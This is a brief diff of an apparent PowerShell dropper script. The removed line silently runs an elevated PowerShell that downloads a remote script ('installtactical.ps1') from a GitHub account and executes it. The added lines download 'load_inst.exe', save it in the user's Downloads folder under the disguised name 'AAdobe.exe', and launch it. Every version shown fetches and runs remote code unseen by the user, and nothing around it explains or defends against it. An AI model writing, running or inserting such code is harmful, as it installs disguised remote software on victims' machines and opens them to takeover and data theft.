@@ -1,1 +1,2 @@
-Start-Process "powershell.exe" -ArgumentList "-Command Invoke-Expression(Invoke-WebRequest -Uri https://raw.githubusercontent.com/pty-spawn/tools/refs/heads/main/installtactical.ps1).Content" -WindowStyle Hidden -Verb runAs
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/pty-spawn/tools/refs/heads/main/load_inst.exe" -OutFile "$env:USERPROFILE\Downloads\AAdobe.exe"
+Start-Process "$env:USERPROFILE\Downloads\AAdobe.exe"
